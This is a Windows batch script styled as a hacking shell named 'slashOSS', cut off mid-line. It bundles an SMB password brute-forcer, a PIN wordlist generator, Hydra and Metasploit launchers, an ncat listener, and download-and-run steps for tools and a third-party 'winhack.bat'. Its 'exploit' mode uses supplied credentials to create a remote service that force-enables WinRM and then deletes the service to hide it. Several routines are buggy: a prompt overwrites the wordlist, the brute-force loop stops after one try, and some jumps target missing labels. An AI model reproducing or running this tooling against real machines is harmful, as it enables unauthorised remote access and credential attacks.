@echo off
chcp 65001 > nul
setlocal enabledelayedexpansion
title slashOSS
mode con cols=80 lines=30

:cmd

color 0f
set /p "type= [7m{살해자}:~@ [0m"

%type%

if "%type%" EQU "ls" ( dir )
if "%type%" EQU "ls -d" ( dir | find "<DIR>" )
if "%type%" EQU "ls -exe" ( dir | find ".exe" )
if "%type%" EQU "ls -d -exe" ( goto secondoption )
if "%type%" EQU "pwd" ( goto pwd )
if "%type%" EQU "clear" ( cls )
if "%type%" EQU "ifconfig" ( goto ifconfig )
if "%type%" EQU "bruteforce" ( goto bruteforce )
if "%type%" EQU "passwd" ( goto passwd )
if "%type%" EQU "neofetch" ( goto neofetching )
if "%type%" EQU "pacman" ( goto error )
if "%type%" EQU "pacman nmap -y" ( goto nmap-install )  
if "%type%" EQU "create wordlist" ( goto createw )
if "%type%" EQU "pacman msfconsole -y" ( goto metasploit-install )
if "%type%" EQU "pacman notpadpp -y" ( goto notpadpp-install )
if "%type%" EQU "pacman python3 -y" ( goto python3-install )  
if "%type%" EQU "pacman hydra -y" ( goto hydra-install )
if "%type%" EQU "h" ( goto commandlist )
if "%type%" EQU "xterm" ( goto xterminal )
if "%type%" EQU "back" ( cd .. )
if "%type%" EQU "pacman winhack -y" ( goto winhack-install ) 
if "%type%" EQU "winhack" ( winhack.bat )
if "%type%" EQU "xrdp" ( goto xrdp )
if "%type%" EQU "msfconsole" ( goto msfconsole )
if "%type%" EQU "hydra" ( goto hydra )
if "%type%" EQU "nc" ( goto nc-listener )
if "%type%" EQU "exploiter" ( goto exploiter )
if "%type%" EQU "pacman putty -y" ( goto putty-install )
if "%type%" EQU "shutdown now" ( shutdown /s /t 0 )
if "%type%" EQU "sudo su" ( powershell "start cmd -verb runas" )
if "%type%" EQU "sniff" ( goto sniffer )
if "%type%" EQU "git" ( goto git ) 
if "%type%" EQU "aircrack" ( goto aircrack )
if "%type%" EQU "spoofing" ( goto spoofing )
if "%type%" EQU "reboot" ( shutdown /r /t 0 )
if "%type%" EQU "nano" ( goto nanoedit )

goto cmd


:ifconfig
 for /f "tokens=2 delims=:" %%a in ( 'ipconfig ^| find "IPv4" ' ) do ( set n=%%a )
 for /f "tokens=6 " %%b in ( 'ipconfig ^| find "DNS Suffix" ' ) do ( set n2=%%b )
 for /f "tokens=2 delims=:" %%c in ( 'ipconfig ^| find "Mask" ' ) do ( set n3=%%c )
 for /f "tokens=2 delims=:" %%d in ( 'ipconfig ^| find "Gateway" ' ) do ( set n4=%%d )

 echo IPv4:[7m%n%[0m
 echo DNS:[7m%n2%[0m
 echo Mask:[7m%n3%[0m
 echo Router:[7m%n4%[0m

 pause > nul

goto cmd

:pwd
echo current path:
cd
goto cmd


:neofetching
cls
echo       ^|^ 
echo #=====^|^#================\
echo #=====^|^#================/
echo       ^|^


systeminfo | find "Host Name"
for /f "tokens=2 delims=:" %%a in ( 'systeminfo ^| find "[01]" ' ) do (
  echo                         %%a
) 

pause > nul
goto cmd


:bruteforce
cls
set /p hostname="hostname>"
set /p username="username>"
set /p wordlist="wordlist>"

set /a count=1
for /f %%a in ( %wordlist% ) do (
set passwd=%%a
call :attempt
) 

:attempt
net use \\%hostname% /user:%username% %passwd% >nul 2>&1
echo ([32m%count%[0m)password:[32m%passwd%[0m
set /a count=%count%+1
goto cmd


:error
cls 
echo u have missed a argument
echo pacman <name> -y 
pause > nul
goto cmd


:nmap-install
cls
echo      [33m########[0m
echo     [33m##########[0m
echo     [33m###[0m
echo     [33m##########[0m
echo      [33m#######[0m
echo     download...
curl https://nmap.org/dist/nmap-7.95-setup.exe -o nmap-7.95-setup.exe.exe 
nmap-7.95-setup.exe 
goto cmd


:createw
for /L %%a in (1000,1,9999) do (

echo creation wordlist...
echo %%a >> word.txt
)
echo DONE!
goto cmd


:metasploit-install
cls
echo      [33m########[0m
echo     [33m##########[0m
echo     [33m###[0m
echo     [33m##########[0m
echo      [33m#######[0m
echo     download...
curl https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe -o msfconsole-installer.exe
msfconsole-installer.exe
goto cmd


:notpadpp-install
cls
echo      [33m########[0m
echo     [33m##########[0m
echo     [33m###[0m
echo     [33m##########[0m
echo      [33m#######[0m
echo     download...
curl https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.7.1/npp.8.7.1.Installer.x64.exe -o notpadpp.exe
notpadpp.exe
goto cmd


:hydra-install
cls
echo      [33m########[0m
echo     [33m##########[0m
echo     [33m###[0m
echo     [33m##########[0m
echo      [33m#######[0m
echo     download...
curl -L -o hydra.zip https://github.com/maaaaz/thc-hydra-windows/archive/master.zip
tar -xf hydra.zip
goto cmd


:python3-install
cls
echo      [33m########[0m
echo     [33m##########[0m
echo     [33m###[0m
echo     [33m##########[0m
echo      [33m#######[0m
echo     download...
curl https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe -o python-3.13.0-amd64.exe
python-3.13.0-amd64.exe
goto cmd

:putty-install
cls
echo      [33m########[0m
echo     [33m##########[0m
echo     [33m###[0m
echo     [33m##########[0m
echo      [33m#######[0m
echo     download...
curl https://the.earth.li/~sgtatham/putty/latest/wa64/putty.exe 
putty.exe
goto cmd


:secondoption
dir | find "<DIR>" 
dir | find ".exe" 
goto cmd



:commandlist
cls
echo [7mslashOSS [0m command list
echo.
echo [7mls:[0m show all directory
echo [7mclear:[0m clean the terminal
echo [7mpwd:[0m watch the current directory
echo [7mifconfig:[0m show the local ip address 
echo [7mpacman:[0m download a file 
echo [7mneofetch:[0m get information of your hardware
echo [7mcreate wordlist:[0m create a wordlist like Crunch
echo [7mbruteforce:[0m do a low level bruteforce attack
echo [7mpasswd:[0m change your system password
echo [7mmsfconsole:[0m run metasploit framework if is installed
echo [7mhydra:[0m do a high level bruteforce attack
echo [7mnc:[0m become a server and stay in listening mode
echo [7mwinhack:[0m run winhack
echo [7mexploiter:[0m goes in exploit mode
echo [7msudo su:[0m run slash as root user
echo [7msniff:[0m sniffing all connections
echo [7mgit:[0m download a github file 
echo [7maircrack:[0m scan all wifi password saved in this computer
echo [7mspoofing:[0m fake default terminal
echo [7mnano:[0m text editor
pause > nul
cls
goto cmd


:passwd
set /p username="username>"
cls
set /p password="new password>"
net user %username% %password% > nul
echo password changed with successfull!
goto cmd


:xterminal
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; $mainForm = New-Object System.Windows.Forms.Form; $mainForm.Text = 'slashOSS'; $lbl = New-Object System.Windows.Forms.Label; $lbl2 = New-Object System.Windows.Forms.Label; $lbl.Text = 'Hello World\n'; $lbl2.Text = 'Hello World\n'; $mainForm.Controls.Add($lbl); $mainForm.Controls.Add($lbl2); $mainForm.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen; $mainForm.ShowDialog()}"
goto cmd



:winhack-install
cls
echo      [33m########[0m
echo     [33m##########[0m
echo     [33m###[0m
echo     [33m##########[0m
echo      [33m#######[0m
echo     download...
curl -L https://github.com/SL4Y3RO4/winhack/blob/main/winhack.bat -o winhack.bat
goto cmd


:msfconsole
cd C:\metasploit
console.bat
goto cmd


:hydra
cd thc-hydra-windows-master

set /p username="username>"
set /p hostname="hostname>"
set /p wordlist="wordlist>"
set /p wordlist="protocol>"

hydra -l %username% -P %wordlist% %hostname% %protocol%  
goto cmd


:nc-listener
cls
cd C:\Program Files (x86)\Nmap
ncat -lvp %RANDOM%
goto cmd


:exploiter
echo [7m   __________________
echo [7m  /                  \
echo   [7m^|   ####   #   #   ^|
echo   [7m^|   #       # #    ^|
echo   [7m^|   ####     #     ^|
echo   [7m^|   #       # #    ^|
echo   [7m^|   ####   #   #   ^|
echo [7m  \__________________/

set /p "command= [7m{살해자/exploiter}0══|#====>[0m"

%command%

if "%command%" EQU "bye" ( goto cmd )
if "%command%" EQU "ls" ( dir )
if "%command%" EQU "clear" ( cls )
if "%command%" EQU "exploit" ( goto exploit )
if "%command%" EQU "h" ( goto help )

goto exploiter


:help
echo bye:exit from exploiter mode
echo ls:show the directories
echo clear:clear the terminal
echo exploit:run the exploiter phase
goto exploiter


:exploit
set  servicename=winrm%random%

set /p username="username>"
set /p hostname="hostname>"
set /p password="password>"
rem remote access
net use \\%hostname% /user:%username% %password% > nul 2>&1
net use \\%hostname% /user:%username% %password% > nul 2>&1

if /I "%errorlevel%" NEQ "0" ( 

    echo access denied. Credentials incorrect
    pause > nul
    goto main
)

echo connection done with successfull!

:winrm
echo Checking for WinRM...
chcp 437 >nul
powershell -Command "Test-WSMan -ComputerName %hostname%" >nul 2>&1
chcp 65001 >nul

if /I "%errorlevel%" NEQ "0" (
  echo Creating Remote Service...
  rem Creates a service on the remote PC that enables WinRM
  sc \\%hostname% create %servicename% binPath= "cmd.exe /c winrm quickconfig -force"
  echo Configuring WinRM...
  sc \\%hostname% start %servicename%
  rem erase
  echo %servicename% 
  sc \\%hostname% delete %servicename%
  goto menu
)

if /I "%errorlevel%" NEQ "0" (
  chcp 65001 >nul
  echo %hostname% has WinRM E
